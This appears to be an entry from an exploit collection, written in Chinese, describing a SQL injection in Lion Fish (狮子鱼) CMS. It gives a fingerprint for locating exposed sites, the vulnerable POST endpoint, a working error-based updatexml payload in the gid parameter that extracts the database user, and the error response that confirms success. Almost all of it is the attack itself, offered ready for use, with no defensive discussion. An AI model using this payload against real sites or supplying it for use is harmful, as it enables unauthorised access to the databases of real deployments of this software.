# 狮子鱼CMSSQL注入漏洞3

狮子鱼CMS ｜ SQL注入 ｜ —
- **指纹**：`body="/seller.php?s=/Public/login"`
- **请求**：`POST /index.php?s=/Scekill/load_gps_goodslist HTTP/1.1`

**Payload**
```
gid=1229) or updatexml(1,concat(0x7e,user(),0x7e),1)#
```
- **响应特征**：404 SQLSTATE